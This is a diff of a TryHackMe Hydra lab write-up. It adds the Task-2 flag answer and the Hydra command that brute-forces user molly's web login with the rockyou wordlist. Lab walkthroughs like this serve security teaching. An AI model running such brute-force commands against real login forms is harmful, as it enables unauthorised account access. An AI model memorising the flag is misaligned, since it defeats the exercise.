@@ -3,6 +3,9 @@
 # Task-1 Hydra Introduction
 ![image](https://user-images.githubusercontent.com/60177793/91703545-fb7bb900-eb97-11ea-8915-39efb8a148a8.png)
 # Task-2 Using Hydra
+# Use Hydra to bruteforce molly’s web password. What is flag 1?
+# Answer : THM{2673a7dd116de68e85c48ec0b1f2612e}
+###### Steps :This can be done by basic hydra command (hydra -l molly -P rockyou.txt http-post-form “/login:username=^USER^&password=^PASS^:incorrect” -V) as given in description
 
 ![image](https://user-images.githubusercontent.com/60177793/91704859-c40e0c00-eb99-11ea-9f7d-9c874f7a20a8.png)
 
